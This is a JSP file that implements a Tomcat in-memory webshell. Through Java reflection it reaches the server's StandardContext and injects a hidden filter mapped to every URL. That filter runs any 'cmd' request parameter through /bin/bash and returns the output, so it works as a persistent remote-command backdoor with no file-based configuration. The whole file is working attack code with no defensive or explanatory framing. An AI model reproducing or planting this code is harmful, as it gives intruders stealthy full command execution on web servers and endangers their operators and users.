<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %><%--
  Created by IntelliJ IDEA.
  User: lcdm123
  Date: 2021/11/30
  Time: 下午10:27
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    ServletContext servletContext = pageContext.getServletContext();
    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
    Field applicationContextFacadefield = ApplicationContextFacade.class.getDeclaredField("context");
    applicationContextFacadefield.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadefield.get(applicationContextFacade);
    Field applicationContextfield = ApplicationContext.class.getDeclaredField("context");
    applicationContextfield.setAccessible(true);
    StandardContext standardContext = (StandardContext) applicationContextfield.get(applicationContext);

    Field filterConfigs = StandardContext.class.getDeclaredField("filterConfigs");
    filterConfigs.setAccessible(true);
    HashMap configs = (HashMap) filterConfigs.get(standardContext);

    String filterName = "lcdm";
    if (configs.get(filterName) == null) {
        Filter filter = new Filter() {

            @Override
            public void init(FilterConfig filterConfig) throws ServletException {
                Filter.super.init(filterConfig);
            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                if(servletRequest.getParameter("cmd")!=null){
                    String[] cmd = {"/bin/bash","-c",servletRequest.getParameter("cmd")};
                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                    byte[] bytes = new byte[1024];
                    int size = 0;
                    try (ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream()){
                        while ((size = inputStream.read(bytes)) != -1) {
                            byteArrayOutputStream.write(bytes, 0, size);
                        }
                        servletResponse.getWriter().println(byteArrayOutputStream.toString());
                    }
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }

            @Override
            public void destroy() {
                Filter.super.destroy();
            }
        };

        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(filterName);
        filterDef.setFilterClass(filter.getClass().getName());
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(filterName);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
        configs.put(filterName,applicationFilterConfig);
        response.getWriter().println("Success");
    }

%>